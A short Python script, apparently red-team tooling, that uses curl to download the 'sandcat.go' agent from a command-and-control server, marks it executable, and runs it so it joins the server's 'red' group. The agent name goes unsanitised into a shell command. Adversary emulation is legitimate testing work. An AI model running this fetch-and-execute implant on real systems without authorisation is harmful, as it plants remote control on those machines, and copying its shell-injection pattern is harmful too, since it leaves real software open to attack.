#!/usr/bin/python3
import os
import subprocess
import sys

class Upload_Agents:
    def Create_(Agents_name):
        fileupload_command = 'server="http://0.0.0.0:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > '+ Agents_name +';chmod +x '+ Agents_name +';./'+ Agents_name +' -server $server -group red -v;'
        subprocess.call(fileupload_command, shell=True)

if __name__ == '__main__':
    Agents_name = sys.argv[1]
    Upload_Agents.Create_(Agents_name)

